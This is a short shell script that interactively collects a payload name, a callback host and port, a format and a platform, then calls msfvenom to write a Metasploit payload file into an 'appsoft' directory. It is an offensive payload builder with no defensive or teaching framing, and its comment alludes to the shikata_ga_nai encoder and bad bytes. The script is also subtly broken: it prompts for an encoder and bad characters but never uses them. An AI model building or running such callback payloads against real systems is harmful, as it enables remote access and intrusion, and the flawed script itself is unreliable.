#!/bin/sh
#x86/shikata_ga_nai ;) encorder :(  bad \x00\0a\0d\04\xa1\xb0\xb7\xEA
echo "payload"
read payloader
echo "lhost?"
read lhostt
echo "lport"
read  lportt
echo "format"
read format
echo "platform"
read plattform
echo "name"
read name
echo "encoder"
read encodeer
echo "badchar"
read badchar
msfvenom --platform $plattform  -p $payloader  LHOST=$lhostt LPORT=$lportt   > appsoft/$name.$format
